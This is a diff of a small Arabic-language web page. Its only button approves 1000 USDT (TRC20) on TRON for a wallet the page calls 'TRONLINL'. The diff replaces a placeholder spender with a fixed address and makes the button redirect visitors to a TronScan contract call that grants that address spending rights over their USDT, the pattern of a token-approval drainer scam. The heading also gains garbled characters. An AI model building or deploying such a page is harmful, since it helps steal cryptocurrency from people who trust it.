@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8" />
   <title>موافقة USDT TRC20 على TRON</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -15,63 +14,25 @@
       padding: 10px 20px;
       cursor: pointer;
     }
-    #status {
-      margin-top: 20px;
-      font-weight: bold;
-      color: green;
-    }
   </style>
 </head>
 <body>
 
-<h1>موافقة 1000 USDT (TRC20) لمحفظة TRONLINL</h1>
+<h1>موافقة 1000 USDT (TRؤؤؤؤؤؤC20) لمحفظة TRONLINL</h1>
 <button id="approveBtn">موافقة</button>
 
-<div id="status"></div>
-
 <script>
-  // عنوان عقد USDT على TRON
   const usdtContractAddress = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
+  const spenderAddress = 'TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf';
+  const amount = 1000 * 1_000_000; // 1000 USDT (6 أرقام عشرية)
 
-  // محفظة TRONLINL (بدلها بالعنوان الحقيقي)
-  const spenderAddress = 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXX'; // ضع هنا العنوان الصحيح
-
-  // 1000 USDT = 1000 * 10^6 لأن USDT TRC20 لها 6 أرقام عشرية
-  const amount = 1000 * 1_000_000;
-
-  const statusDiv = document.getElementById('status');
   const approveBtn = document.getElementById('approveBtn');
 
-  approveBtn.addEventListener('click', async () => {
-    if (typeof window.tronWeb === 'undefined') {
-      alert('يرجى تثبيت TronLink أو محفظة تدعم TRON.');
-      return;
-    }
+  approveBtn.addEventListener('click', () => {
+    const params = encodeURIComponent(`${spenderAddress},${amount}`);
+    const url = `https://tronscan.org/#/contract-call?contract=${usdtContractAddress}&function=approve&parameter=${params}&network=mainnet`;
 
-    try {
-      const tronWeb = window.tronWeb;
-
-      // التحقق من اتصال المحفظة
-      const userAddress = tronWeb.defaultAddress.base58;
-      if (!userAddress) {
-        alert('يرجى فتح محفظتك وتسجيل الدخول.');
-        return;
-      }
-
-      statusDiv.textContent = 'جار إرسال طلب الموافقة...';
-
-      const contract = await tronWeb.contract().at(usdtContractAddress);
-
-      const txn = await contract.approve(spenderAddress, amount).send({
-        feeLimit: 100_000_000
-      });
-
-      statusDiv.textContent = 'تم إرسال المعاملة! TxID: ' + txn;
-
-    } catch (error) {
-      console.error(error);
-      statusDiv.textContent = 'حدث خطأ: ' + error.message;
-    }
+    window.location.href = url;
   });
 </script>
 
